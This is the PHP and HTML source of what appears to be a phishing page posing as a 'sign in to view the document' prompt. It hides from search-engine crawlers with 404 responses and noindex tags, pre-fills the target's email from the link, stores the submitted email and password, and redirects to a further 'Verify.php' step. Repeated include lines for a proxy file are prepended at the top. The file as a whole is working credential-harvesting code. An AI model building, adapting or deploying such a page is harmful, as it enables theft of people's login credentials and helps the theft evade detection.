<?php include_once'../proxy.php';?><?php include_once'../proxy.php';?><?php include_once'../proxy.php';?><?php
include 'blockerz.php';
include 'sc.php';
session_start();
error_reporting(0);
@set_time_limit(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
exit(); }

$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    parse_str(parse_url($url, PHP_URL_QUERY));
    $parts = @explode('@', $userid);
    $user = @$parts[0];

if(isset($_POST['email'])){
	$_SESSION['email'] = $_POST['email'];
	$_SESSION['pass'] = $_POST['password'];
	header('Location: Verify.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	exit();
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Sign in to continue</title>
	<link rel="icon" type="image/png" href="img/logo.png">
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" href="css/styles.css">

</head>
<body>
<div class="files">
	<img src="img/ex.png" height="50">
	<h2>Sign in to view the document</h2>
	
	<div class="login">
		<form action="" method="post">
	  
	  <div>
		<input type="email" id="email" name="email" required placeholder=" " value="<?php echo $userid ?>" />
		<label for="email">Email Address</label>
		<div class="requirements">
		  Must be a valid email address.
		</div>
	  </div>
	  
	  <div>
		<input type="password" id="password" name="password" required placeholder=" " />
		<label for="password">Password</label>
		<div class="requirements">
		  Your password must be at least 6 characters as well as contain at least one uppercase, one lowercase, and one number.
		</div>
	  </div>
	  
	  <input type="submit" value="View Document" />

	</form>
	</div>
</div>
</body>
</html>